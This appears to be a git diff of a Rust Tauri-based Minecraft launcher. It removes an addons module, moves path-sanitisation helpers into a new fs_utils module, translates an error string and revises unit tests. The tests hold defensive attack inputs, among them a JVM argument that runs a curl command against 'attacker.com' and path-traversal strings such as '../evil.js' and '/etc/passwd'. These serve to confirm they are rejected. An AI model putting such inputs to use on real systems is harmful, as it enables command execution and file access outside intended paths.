@@ -1,5 +1,5 @@
-pub mod addons;
 pub mod auth;
+mod fs_utils;
 pub mod minecraft;
 pub mod msa;
 pub mod open_launcher;
@@ -299,7 +299,7 @@ async fn launch_game(
         )
         .is_err()
     {
-        return Err("Игра уже запускается или запущена".to_string());
+        return Err("O jogo já está iniciando ou em execução".to_string());
     }
 
     let res = launch_game_inner(profile_id, version_id, &state, app).await;
@@ -1244,7 +1244,7 @@ async fn extract_instance_zip_folder(
     let target_base = if dest_subpath.is_empty() {
         instance_dir.clone()
     } else {
-        crate::addons::sanitize_path(&instance_dir, std::path::Path::new(&dest_subpath))?
+        crate::fs_utils::sanitize_path(&instance_dir, std::path::Path::new(&dest_subpath))?
     };
 
     for i in 0..archive.len() {
@@ -1252,7 +1252,7 @@ async fn extract_instance_zip_folder(
             let name = entry.name().to_string();
             if name.starts_with(&prefix) && !name.ends_with('/') {
                 let rel = name.strip_prefix(&prefix).unwrap_or(&name);
-                if let Ok(target) = crate::addons::safe_zip_extract_path(&target_base, rel) {
+                if let Ok(target) = crate::fs_utils::safe_zip_extract_path(&target_base, rel) {
                     if let Some(parent) = target.parent() {
                         let _ = std::fs::create_dir_all(parent);
                     }
@@ -1396,15 +1396,7 @@ pub fn run() {
             get_app_memory_usage,
             get_playtime_summary,
             get_last_crash_diagnostics,
-            apply_crash_action,
-            addons::get_installed_addons_from_disk,
-            addons::read_addon_file,
-            addons::uninstall_addon_files,
-            addons::install_addon_from_archive_bytes,
-            addons::download_and_install_addon,
-            addons::download_addon_archive_bytes,
-            addons::save_local_addon,
-            addons::inspect_addon_archive
+            apply_crash_action
         ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
@@ -1413,7 +1405,6 @@ pub fn run() {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use std::path::Path;
 
     #[test]
     fn test_app_memory() {
@@ -1424,15 +1415,15 @@ mod tests {
 
     #[test]
     fn test_validate_safe_id() {
-        assert!(validate_safe_id("valid-addon-1").is_ok());
-        assert!(validate_safe_id("skin_3d_viewer").is_ok());
+        assert!(validate_safe_id("valid-instance-1").is_ok());
+        assert!(validate_safe_id("valid_profile_1").is_ok());
         assert!(validate_safe_id("1.20.4").is_ok());
 
         assert!(validate_safe_id("").is_err());
         assert!(validate_safe_id("../evil").is_err());
         assert!(validate_safe_id("evil/path").is_err());
         assert!(validate_safe_id("evil\\path").is_err());
-        assert!(validate_safe_id("addon\0null").is_err());
+        assert!(validate_safe_id("profile\0null").is_err());
     }
 
     #[test]
@@ -1447,48 +1438,5 @@ mod tests {
         assert!(!is_safe_jvm_arg("-XX:OnError=curl http://attacker.com"));
         assert!(!is_safe_jvm_arg("-XX:OnOutOfMemoryError=reboot"));
         assert!(!is_safe_jvm_arg("-Xbootclasspath:/tmp/override"));
-    }
-
-    #[test]
-    fn test_addons_path_sanitization() {
-        let base = Path::new("/tmp/obsy_test_base");
-
-        // Safe paths
-        let safe1 = addons::sanitize_path(base, Path::new("index.js")).unwrap();
-        assert_eq!(safe1, base.join("index.js"));
-
-        let safe2 = addons::sanitize_path(base, Path::new("assets/icon.png")).unwrap();
-        assert_eq!(safe2, base.join("assets/icon.png"));
-
-        // Path traversal attempts
-        assert!(addons::sanitize_path(base, Path::new("../evil.js")).is_err());
-        assert!(addons::sanitize_path(base, Path::new("/etc/passwd")).is_err());
-        assert!(addons::sanitize_path(base, Path::new("nested/../../evil")).is_err());
-
-        // Zip extract paths
-        assert!(addons::safe_zip_extract_path(base, "index.js").is_ok());
-        assert!(addons::safe_zip_extract_path(base, "sub/dir/file.txt").is_ok());
-        assert!(addons::safe_zip_extract_path(base, "../evil.js").is_err());
-        assert!(addons::safe_zip_extract_path(base, "../../root.txt").is_err());
-        assert!(addons::safe_zip_extract_path(base, "/absolute/path").is_err());
-    }
-
-    #[test]
-    fn test_addon_verification_spoof_prevention() {
-        // Unknown or spoofed author addon with invalid hash must not be verified
-        assert!(!addons::is_verified_addon("unknown-addon", None));
-        assert!(!addons::is_verified_addon(
-            "unknown-addon",
-            Some("a94caf582b190a8413ce0b154fa9f024c359a849b0c2e589add6fe3d1e779700")
-        ));
-        assert!(!addons::is_verified_addon(
-            "skin-3d-viewer",
-            Some("fake_hash")
-        ));
-        // Correct official addon checksum matches
-        assert!(addons::is_verified_addon(
-            "skin-3d-viewer",
-            Some("a94caf582b190a8413ce0b154fa9f024c359a849b0c2e589add6fe3d1e779700")
-        ));
     }
 }
